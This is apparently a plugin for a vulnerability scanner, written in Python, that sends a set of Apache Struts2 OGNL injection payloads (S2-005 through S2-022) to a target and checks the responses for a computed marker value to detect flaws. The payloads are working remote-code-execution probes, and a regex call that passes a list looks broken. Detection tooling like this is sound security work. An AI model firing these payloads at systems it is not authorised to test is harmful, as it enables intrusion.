# -*- coding:utf-8 -*-

import re
from exp.lib.httpparse import httpparse

def verify(protocol,ip,port):
    payloads = {"S2-005":"('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43xman.getWriter().println(1111*2222)')(d))&(i99)(('\\43xman.getWriter().close()')(d))",
                "S2-009A":"class.classLoader.jarPath=(#context['xwork.MethodAccessor.denyMethodExecution']= new java.lang.Boolean(false), #_memberAccess['allowStaticMethodAccess']=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(1111*2222),#outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]",
                "S2-009B":"class['classLoader'].jarPath=(#context['xwork.MethodAccessor.denyMethodExecution']= new java.lang.Boolean(false), #_memberAccess['allowStaticMethodAccess']=true,#req=@org.apache.struts2.ServletActionContext@getRequest(),#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#outstr.println(1111*2222),#outstr.close())(meh)&z[(class['classLoader'].jarPath)('meh')]",
                "S2-013":"a=1${(%23_memberAccess['allowStaticMethodAccess']=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.println(1111*2222),%23k8out.close())}",
                "S2-016A":"redirect:${1111*2222}",
                "S2-016B":"redirectAction:${1111*2222}",
                "S2-016C":"action:${1111*2222}",
                "S2-019A":"debug=command&expression=1111*2222",
                "S2-019B":"debug=command&expression=%23_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime()",
                "S2-020":"Class.ClassLoader.parent=GENXOR",
                "S2-021":"Class['ClassLoader'].resources=GENXOR",
                "S2-022A":"Class.ClassLoader.parent=GENXOR",
                "S2-022B":"Class['ClassLoader'].resources=GENXOR",
                }
    success = []
    payload = {}
    url = protocol+'://'+ip+':'+str(port)
    for id in payloads:
        if not re.search(list(filter(str.isdigit,id)),str(success)):
            http = httpparse()
            tm = http.httpreq("POST",protocol,ip,str(port),data=payloads[id])
            if re.search('S2-016', id):
                if re.search('2468642', str(tm[1][1])):
                    success.append(list(filter(str.isdigit,id)))
                    payload[id] = tm[0]
            elif id == "S2-020" or id == "S2-021":
                if tm[1][0] == 404 and http.httpreq('POST',protocol,ip,str(port), data='')[1][0] != 404:
                    success.append(list(filter(str.isdigit,id)))
                    payload[id] = tm[0]
            elif re.search('S2-022', id):
                if http.httpreq('GET', protocol,ip,port, header={"Cookie":payloads[id]})[1][0] == 404 and http.httpreq('get',protocol,ip,port)[1][0] != 404:
                    success.append(list(filter(str.isdigit,id)))
                    payload[id] = tm[0]
            else:
                if re.search('2468642|java\.lang\.Runtime@', tm[1][2], re.I):
                    success.append(list(filter(str.isdigit,id)))
                    payload[id] = tm[0]
    for k in list(payload.keys()):
        if payload[k] != 404:
            msg = 'There is a struts2 vul , payloadid is'+k+'.'
            print(msg)
            return True,url,msg
        else:
            pass
    else:
        msg = 'There is no struts2 vul'
        return True,url,msg




